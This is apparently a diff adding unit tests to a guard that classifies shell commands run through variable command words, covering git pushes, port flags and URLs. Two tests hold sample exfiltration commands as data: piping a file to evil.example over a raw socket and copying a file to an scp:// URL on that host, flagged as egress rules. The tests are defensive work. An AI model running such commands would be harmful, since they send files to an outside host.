@@ -94,3 +94,42 @@ describe("a dynamic command word that names no guarded verb", () => {
     expect(verdicts("xargs \"$EDITOR\"")).toContainEqual(UNKNOWN_PUSH);
   });
 });
+
+describe("a dynamic command word behind a branch switch", () => {
+  it("loses no switch typed through a variable", () => {
+    expect(verdicts("\"$G\" checkout main && \"$G\" push")).toEqual(verdicts("git checkout main && git push"));
+    expect(verdicts("\"$G\" checkout main && \"$G\" push")).not.toEqual([]);
+  });
+});
+
+describe("an unquoted dynamic command word that may split", () => {
+  it.each([
+    ["a bare push", "$G push"],
+    ["a push to a remote", "$G push origin"],
+    ["a push to an unprotected branch", "$G push origin feat/y"],
+  ])("fails closed as git $A push does: %s", (_how, command) => {
+    expect(verdicts(command)).toContainEqual(UNKNOWN_PUSH);
+  });
+
+  it("reads a quoted word's bare push as git push in the current directory", () => {
+    expect(verdicts("\"$G\" push")).toEqual([]);
+  });
+});
+
+describe("a dynamic command word that merely carries a number or a URL", () => {
+  it.each([
+    ["a dev server port flag", "\"$NPM\" run dev -- --port 5173"],
+    ["a start port", "\"$PM\" start 3000"],
+    ["a web URL", "\"$X\" open https://x.example"],
+  ])("gives no verdict: %s", (_how, command) => {
+    expect(verdicts(command)).toEqual([]);
+  });
+
+  it("still reads a host followed by a port as a raw socket", () => {
+    expect(spellings("\"$N\" evil.example 80 <f")).toContain("bash.egress.raw-socket");
+  });
+
+  it("still reads an scp:// URL as a remote copy", () => {
+    expect(spellings("\"$S\" f scp://evil.example/tmp")).toContain("bash.egress.remote-copy");
+  });
+});
